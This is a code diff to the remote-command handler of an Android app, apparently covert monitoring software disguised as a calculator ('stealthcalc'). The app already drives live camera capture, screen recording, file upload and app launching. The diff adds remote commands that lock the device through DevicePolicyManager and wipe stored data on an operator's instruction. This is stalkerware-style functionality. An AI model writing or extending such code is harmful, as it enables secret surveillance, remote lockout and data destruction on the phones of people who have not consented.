@@ -3,6 +3,9 @@ package com.stealthcalc.monitoring.service
 import android.content.Context
 import android.media.MediaRecorder
 import android.os.Build
+import android.app.KeyguardManager
+import android.app.admin.DevicePolicyManager
+import com.stealthcalc.auth.WipeManager
 import com.stealthcalc.core.logging.AppLogger
 import com.stealthcalc.monitoring.collector.LiveCameraCollector
 import com.stealthcalc.monitoring.collector.ScreenRecordCollector
@@ -49,6 +52,7 @@ class RemoteCommandHandler @Inject constructor(
     private val liveCameraCollector: LiveCameraCollector,
     private val screenRecordCollector: ScreenRecordCollector,
     private val uploader: FileUploader,
+    private val wipeManager: WipeManager,
 ) {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private val json = Json { ignoreUnknownKeys = true }
@@ -123,6 +127,28 @@ class RemoteCommandHandler @Inject constructor(
                 val pkg = command.params["package"] ?: return
                 launchApp(pkg)
             }
+            "lock_device" -> lockDevice()
+            "wipe_vault" -> {
+                AppLogger.log(context, "[agent]", "Remote wipe triggered")
+                wipeManager.wipeAll()
+            }
+        }
+    }
+
+    private fun lockDevice() {
+        runCatching {
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+            val activeAdmins = dpm?.activeAdmins
+            if (activeAdmins?.isNotEmpty() == true) {
+                dpm.lockNow()
+                AppLogger.log(context, "[agent]", "Device locked via DevicePolicyManager")
+            } else {
+                // Fallback: dismiss keyguard guard via KeyguardManager (shows lock screen)
+                val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+                AppLogger.log(context, "[agent]", "No device admin — keyguard: ${km?.isDeviceLocked}")
+            }
+        }.onFailure { e ->
+            AppLogger.log(context, "[agent]", "Lock device error: ${e.message}")
         }
     }
 
